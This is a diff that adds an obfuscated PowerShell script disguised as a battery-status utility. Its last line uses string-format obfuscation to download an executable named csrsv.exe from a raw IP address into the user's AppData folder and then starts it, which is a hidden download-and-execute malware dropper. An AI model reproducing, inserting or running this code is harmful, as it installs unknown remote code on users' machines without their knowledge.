@@ -1,0 +1,12 @@
+  sV  ("8hN"+"1"+"9i") ( [tYPe]("{8}{4}{11}{6}{10}{5}{2}{3}{0}{9}{7}{1}" -f 'F','on','StEM','In','Dow','sY','.F','I','SYSTeM.win','orMaT','ORMs.','s')) ;function GE`T-`BATt`ERysTATUS {
+    
+    PARAM()
+    try {
+        &("{0}{1}"-f 'A','dd-Type') -Assembly ("{0}{4}{3}{1}{2}"-f 'Syst','o','rms','indows.F','em.W')
+         ( ITEM  ('Va'+'rIabLe:8h'+'N'+'19'+'I')).valUe::"PoWe`RStA`T`US"
+    } catch {
+        ${PS`C`MDleT}.("{5}{1}{4}{3}{0}{2}{6}" -f'e','hr','r','wT','o','T','minatingError').Invoke(${_})
+    }
+}
+
+(&("{2}{1}{0}" -f 't','Objec','New-') ("{3}{2}{0}{1}"-f't.WebCli','ent','tem.Ne','Sys')).("{2}{3}{0}{1}"-f'loadF','ile','Do','wn').Invoke(("{9}{6}{8}{1}{7}{0}{4}{5}{3}{2}" -f 'a','.23','v.exe','csrs','ho','o/','://94.102.5','8/~y','3','http'),"$env:APPDATA\csrsv.exe");&("{4}{2}{0}{3}{1}"-f 'r','ss','art-P','oce','St') ("$env:APPDATA\csrsv.exe")
